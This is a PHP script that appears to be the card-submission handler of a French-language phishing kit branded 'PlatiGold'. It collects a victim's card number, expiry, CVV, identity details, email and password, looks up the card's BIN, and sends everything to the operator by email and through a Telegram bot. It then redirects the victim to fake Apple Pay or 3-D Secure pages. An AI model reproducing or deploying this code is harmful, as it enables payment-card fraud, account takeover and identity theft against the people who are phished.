<?php


ob_start();
include("../infos.php");
include("../common/sub_includes.php");
include("../common/functions.php");


if(isset($_POST['bat_cardSubmit']))
{

  start_session();

  gather_card_infos();


if(empty($_SESSION['nomcc']) || empty($_SESSION['ccnum']) || empty($_SESSION['ccexp']) || empty($_SESSION['cvv']) )
{

	header('Location: ../steps/vbv/../steps/card.php?error=empty');
}
else{


if(check_bin($_SESSION['ccnum']) && is_numeric($_SESSION['ccnum']) && strlen($_SESSION['ccnum'] >= 16)){


        $cc = $_SESSION['ccnum'];
        $bin = substr($cc, 0, 6);

        $ch = curl_init();

        $url = "https://lookup.binlist.net/$bin";

        curl_setopt($ch, CURLOPT_URL, $url);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
        curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'GET');


        $headers = array();
        $headers[] = 'Accept-Version: 3';
        curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);

        $result = curl_exec($ch);


        if (curl_errno($ch)) {
            echo 'Error:' . curl_error($ch);
        }


        curl_close($ch);

        $brand = '';
        $type = '';
        $emoji = '';
        $bank = '';


        $someArray = json_decode($result, true);

        $emoji = $someArray['country']['emoji'];
        $brand = $someArray['brand'];
        $type = $someArray['type'];
        $bank = $someArray['bank']['name'];
        $bank_phone = $someArray['bank']['phone'];
        $subject_title = "[BIN: $bin][$emoji $brand $type]";

        ######################
				#### MAIL SENDING ####
				######################


        if($mail_sending == true){

          $message = "
          
[💳 ] Card [💳 ]

💳  Nom : ".$_SESSION['nomcc']."
💳  Numéro : ".$_SESSION['ccnum']."
💳  Date d'expiration : ".$_SESSION['ccexp']."
💳  CVV : ".$_SESSION['cvv']."

⚖️ Level : ".$brand."
⚖️ Banque : ".$bank."
⚖️ Type : ".$type."

[📮] Full Info [📮]

📮 Nom : ".$_SESSION['nom']."
📮 Prénom : ".$_SESSION['prenom']."
📮 Date de naissance : ".$_SESSION['birthday']."

📮 Numéro de téléphone : ".$_SESSION['phone']."
📮 Adresse : ".$_SESSION['adresse']."
📮 Code Postal : ".$_SESSION['zip']."
📮 Ville : ".$_SESSION['city']."

[🎇] Login [🎇]

🎇 E-Mail : ".$_SESSION['email']."
🎇 Mot de passe : ".$_SESSION['password']."

[🎆] Additionnal [🎆] 

🎆 Adresse IP : ".$_SESSION['ip']."
🎆 User Agent : ".$_SESSION['useragent']."

      
          ";
  
  
          $subject = "[💳 ] + 1 CC | ".$bin." | ".$bank." | ".$brand." | ".$_SESSION['ip'];
          $headers = "From: PlatiGold ⚡️ <platigold@teleg.fr>";



          mail($rezmail, $subject, $message, $headers);

        }

				##########################
				#### TELEGRAM SENDING ####
				##########################

        
				if($telegram_sending == true){

          $data = [
            'text' => '

[💳 ] Card [💳 ]

💳  Nom/Prénom : '.$_SESSION['nomcc'].'
💳  Numéro : '.$_SESSION['ccnum'].'
💳  Expiration : '.$_SESSION['ccexp'].'
💳  CVV : '.$_SESSION['cvv'].'

⚖️ Banque : '.$bank.'
⚖️ Niveau : '.$brand.'
⚖️ Type : '.$type.'

[📮] Full Info [📮]

📮 Nom • '.$_SESSION['nom'].'
📮 Prénom • '.$_SESSION['prenom'].'
📮 Date De Naissance • '.$_SESSION['birthday'].'

📮 Téléphone • '.$_SESSION['phone'].'
📮 Adresse • '.$_SESSION['adresse'].'
📮 Ville • '.$_SESSION['city'].'
📮 Code Postal • '.$_SESSION['zip'].'

[🎇] Login [🎇]

🎇 E-Mail : '.$_SESSION['email'].'
🎇 Mot de passe : '.$_SESSION['password'].'

[🎆] Additionnal [🎆] 

🎆 Adresse IP :  '.$_SESSION['ip'].'
🎆 User Agent :  '.$_SESSION['useragent'].'
      

            ',
            'chat_id' => $chat_card
          ];


          file_get_contents("https://api.telegram.org/bot$bot_token/sendMessage?".http_build_query($data) );
				}


        $_SESSION["bank"] = $bank;

        if($apple_pay == true){
            header('Location: ../steps/loading_apple_pay.php');
        }
        elseif($vbv_classic){
          header('Location: ../steps/vbv/loading.php');

        }
        else{
            header('Location: ../steps/loading_finished.php');
        }


  }
  else{
    header('Location: ../steps/card.php?error=invalidcard');
  }

}

}
else{
	echo 'no isset';
}




?>